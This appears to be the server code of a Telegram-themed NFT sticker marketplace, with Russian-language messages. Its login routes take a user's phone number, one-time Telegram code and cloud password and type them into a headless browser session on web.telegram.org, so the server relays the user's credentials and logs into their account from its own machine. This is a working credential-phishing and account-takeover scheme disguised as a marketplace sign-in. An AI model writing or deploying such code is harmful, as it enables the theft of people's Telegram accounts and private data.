import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';
import puppeteer from 'puppeteer-core';
import chromium from 'chrome-aws-lambda';

dotenv.config();

const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data for NFTs
const sampleNFTs = [
  {
    id: 1,
    name: "Golden Star",
    description: "Блестящая золотая звезда",
    imageUrl: "https://via.placeholder.com/300x300/FFD700/000000?text=⭐",
    price: 0.99,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 2,
    name: "Heart Gift",
    description: "Подарок в виде сердца",
    imageUrl: "https://via.placeholder.com/300x300/FF69B4/FFFFFF?text=💝",
    price: 1.49,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 3,
    name: "Diamond Premium",
    description: "Роскошный бриллиант",
    imageUrl: "https://via.placeholder.com/300x300/B9F2FF/000000?text=💎",
    price: 2.99,
    category: "premium",
    isAvailable: true
  }
];

// In-memory storage
let users = [];
let telegramSessions = new Map(); // sessionId -> {browser, page, phone, status}
let userSessions = new Map();

// Launch browser with Railway-compatible config
async function launchBrowser() {
  const browser = await puppeteer.launch({
    args: chromium.args,
    executablePath: await chromium.executablePath,
    headless: chromium.headless,
    ignoreHTTPSErrors: true,
  });
  return browser;
}

// Telegram Web automation class
class TelegramWebAuth {
  constructor(sessionId) {
    this.sessionId = sessionId;
    this.browser = null;
    this.page = null;
    this.phone = null;
    this.status = 'init';
  }

  async init() {
    console.log('🚀 Launching browser for Telegram Web...');
    this.browser = await launchBrowser();
    this.page = await this.browser.newPage();
    
    // Set viewport and user agent
    await this.page.setViewport({ width: 1200, height: 800 });
    await this.page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    
    // Navigate to Telegram Web
    console.log('🌐 Navigating to Telegram Web...');
    await this.page.goto('https://web.telegram.org/', { 
      waitUntil: 'networkidle2',
      timeout: 30000 
    });

    this.status = 'ready';
    return true;
  }

  async enterPhone(phone) {
    this.phone = phone;
    console.log(`📱 Entering phone number: ${phone}`);

    try {
      // Wait for phone input field (new Telegram Web design)
      await this.page.waitForSelector('input[type="tel"]', { timeout: 10000 });
      
      // Enter phone number
      const phoneInput = await this.page.$('input[type="tel"]');
      await phoneInput.click({ clickCount: 3 });
      await phoneInput.type(phone, { delay: 100 });

      // Click next button
      const nextButton = await this.page.$('button.Button[type="submit"]');
      if (nextButton) {
        await nextButton.click();
      }

      this.status = 'waiting_code';
      console.log('✅ Phone number entered, waiting for code...');
      return true;

    } catch (error) {
      console.error('Error entering phone:', error);
      this.status = 'error';
      return false;
    }
  }

  async enterCode(code) {
    console.log(`🔐 Entering code: ${code}`);

    try {
      // Wait for code input field
      await this.page.waitForSelector('input[type="tel"]', { timeout: 10000 });
      
      // Enter code
      const codeInput = await this.page.$('input[type="tel"]');
      await codeInput.click({ clickCount: 3 });
      await codeInput.type(code, { delay: 100 });

      // Click next/submit button
      const submitButton = await this.page.$('button.Button[type="submit"]');
      if (submitButton) {
        await submitButton.click();
      }

      // Wait for result (password prompt or success)
      await this.page.waitForTimeout(3000);

      // Check if password is required
      const passwordInput = await this.page.$('input[type="password"]');
      if (passwordInput) {
        this.status = 'need_password';
        console.log('🔑 Cloud password required');
        return { success: true, nextStep: 'password' };
      }

      // Check if login successful
      const chatList = await this.page.$('.ChatList');
      if (chatList) {
        this.status = 'logged_in';
        console.log('✅ Login successful!');
        return { success: true, nextStep: 'complete' };
      }

      return { success: false, error: 'Unable to determine login status' };

    } catch (error) {
      console.error('Error entering code:', error);
      return { success: false, error: error.message };
    }
  }

  async enterPassword(password) {
    console.log(`🔑 Entering cloud password`);

    try {
      // Wait for password input
      await this.page.waitForSelector('input[type="password"]', { timeout: 5000 });
      
      // Enter password
      const passwordInput = await this.page.$('input[type="password"]');
      await passwordInput.type(password, { delay: 100 });

      // Click submit
      const submitButton = await this.page.$('button.Button[type="submit"]');
      if (submitButton) {
        await submitButton.click();
      }

      // Wait for login completion
      await this.page.waitForTimeout(3000);

      // Check if login successful
      const chatList = await this.page.$('.ChatList');
      if (chatList) {
        this.status = 'logged_in';
        console.log('✅ Login with password successful!');
        return { success: true };
      }

      return { success: false, error: 'Password might be incorrect' };

    } catch (error) {
      console.error('Error entering password:', error);
      return { success: false, error: error.message };
    }
  }

  async getSessionData() {
    if (this.status !== 'logged_in') {
      return null;
    }

    try {
      // Extract user data from Telegram Web
      const userData = await this.page.evaluate(() => {
        // This would extract actual user data from Telegram Web UI
        // For demo, return mock data
        return {
          firstName: 'Telegram',
          lastName: 'User',
          username: null,
          phone: this.phone
        };
      });

      return userData;
    } catch (error) {
      console.error('Error getting session data:', error);
      return null;
    }
  }

  async close() {
    if (this.browser) {
      await this.browser.close();
    }
  }
}

// Routes
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'NFT Marketplace is running!',
    timestamp: new Date().toISOString()
  });
});

app.get('/', (req, res) => {
  res.sendFile('frontend/index.html', { root: '.' });
});

app.get('/marketplace', (req, res) => {
  res.sendFile('frontend/marketplace.html', { root: '.' });
});

// API Routes
app.get('/api/nft', async (req, res) => {
  try {
    const { category } = req.query;
    
    let nfts = sampleNFTs;
    
    if (category && category !== 'all') {
      nfts = sampleNFTs.filter(nft => nft.category === category);
    }
    
    res.json({ success: true, nfts });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Start Telegram Web authentication
app.post('/api/auth/start-telegram-web', async (req, res) => {
  try {
    const { phone } = req.body;
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона' 
      });
    }

    // Create session
    const sessionId = crypto.randomBytes(16).toString('hex');
    const telegramAuth = new TelegramWebAuth(sessionId);
    
    // Initialize browser
    const initialized = await telegramAuth.init();
    if (!initialized) {
      return res.status(500).json({ 
        success: false, 
        error: 'Не удалось инициализировать браузер' 
      });
    }

    // Enter phone number
    const phoneEntered = await telegramAuth.enterPhone(phone);
    if (!phoneEntered) {
      await telegramAuth.close();
      return res.status(500).json({ 
        success: false, 
        error: 'Не удалось ввести номер телефона' 
      });
    }

    // Store session
    telegramSessions.set(sessionId, telegramAuth);

    res.json({
      success: true,
      sessionId: sessionId,
      message: 'Бот открыл Telegram Web и ввел ваш номер. Код отправлен в ваш Telegram аккаунт.',
      nextStep: 'enter_code'
    });
    
  } catch (error) {
    console.error('Start auth error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка запуска авторизации: ' + error.message 
    });
  }
});

// Submit code to Telegram Web
app.post('/api/auth/submit-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    
    if (!sessionId || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Session ID и код обязательны' 
      });
    }

    const telegramAuth = telegramSessions.get(sessionId);
    if (!telegramAuth) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    // Enter code
    const result = await telegramAuth.enterCode(code);
    
    if (!result.success) {
      return res.status(400).json({ 
        success: false, 
        error: result.error 
      });
    }

    if (result.nextStep === 'password') {
      res.json({
        success: true,
        message: 'Код принят. Требуется облачный пароль.',
        nextStep: 'enter_password'
      });
    } else if (result.nextStep === 'complete') {
      // Login successful without password
      await completeAuthentication(telegramAuth, sessionId, res);
    } else {
      res.status(400).json({ 
        success: false, 
        error: 'Неизвестный статус авторизации' 
      });
    }
    
  } catch (error) {
    console.error('Submit code error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка ввода кода: ' + error.message 
    });
  }
});

// Submit cloud password
app.post('/api/auth/submit-password', async (req, res) => {
  try {
    const { sessionId, password } = req.body;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Session ID обязателен' 
      });
    }

    const telegramAuth = telegramSessions.get(sessionId);
    if (!telegramAuth) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    // Enter password
    const result = await telegramAuth.enterPassword(password || '');
    
    if (!result.success) {
      return res.status(400).json({ 
        success: false, 
        error: result.error 
      });
    }

    // Login successful with password
    await completeAuthentication(telegramAuth, sessionId, res);
    
  } catch (error) {
    console.error('Submit password error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка ввода пароля: ' + error.message 
    });
  }
});

// Complete authentication process
async function completeAuthentication(telegramAuth, sessionId, res) {
  try {
    // Get user data from Telegram session
    const telegramUserData = await telegramAuth.getSessionData();
    
    // Create user in our system
    let user = users.find(u => u.phone === telegramAuth.phone);
    const isNewUser = !user;
    
    if (!user) {
      user = {
        id: users.length + 1,
        phone: telegramAuth.phone,
        telegramId: Math.floor(100000000 + Math.random() * 900000000),
        firstName: telegramUserData?.firstName || 'Telegram',
        lastName: telegramUserData?.lastName || 'User',
        username: telegramUserData?.username,
        isVerified: true,
        createdAt: new Date(),
        lastLogin: new Date()
      };
      users.push(user);
    } else {
      user.lastLogin = new Date();
    }

    // Create user session
    const userSessionId = crypto.randomBytes(32).toString('hex');
    userSessions.set(userSessionId, {
      userId: user.id,
      telegramId: user.telegramId,
      phone: user.phone,
      expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000
    });

    // Close Telegram session
    await telegramAuth.close();
    telegramSessions.delete(sessionId);

    res.json({
      success: true,
      message: isNewUser ? 'Аккаунт создан и авторизован!' : 'Вход выполнен!',
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        username: user.username
      },
      sessionId: userSessionId
    });
    
  } catch (error) {
    console.error('Complete auth error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка завершения авторизации: ' + error.message 
    });
  }
}

// Verify session
app.get('/api/auth/verify-session', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Session ID обязателен' 
      });
    }

    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ 
        success: false, 
        error: 'Недействительная сессия' 
      });
    }

    if (Date.now() > session.expiresAt) {
      userSessions.delete(sessionId);
      return res.status(401).json({ 
        success: false, 
        error: 'Сессия истекла' 
      });
    }

    const user = users.find(u => u.id === session.userId);
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        error: 'Пользователь не найден' 
      });
    }

    res.json({
      success: true,
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        username: user.username,
        isVerified: user.isVerified
      }
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Cleanup expired sessions
setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of telegramSessions.entries()) {
    if (now - session.createdAt > 10 * 60 * 1000) { // 10 minutes
      session.close();
      telegramSessions.delete(sessionId);
    }
  }
}, 60000);

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Environment: ${process.env.NODE_ENV}`);
  console.log(`🎮 Health check: http://localhost:${PORT}/health`);
  console.log(`🏠 Main page: http://localhost:${PORT}/`);
  console.log(`🛍️ Marketplace: http://localhost:${PORT}/marketplace`);
  console.log(`🤖 Telegram Web automation ready`);
});
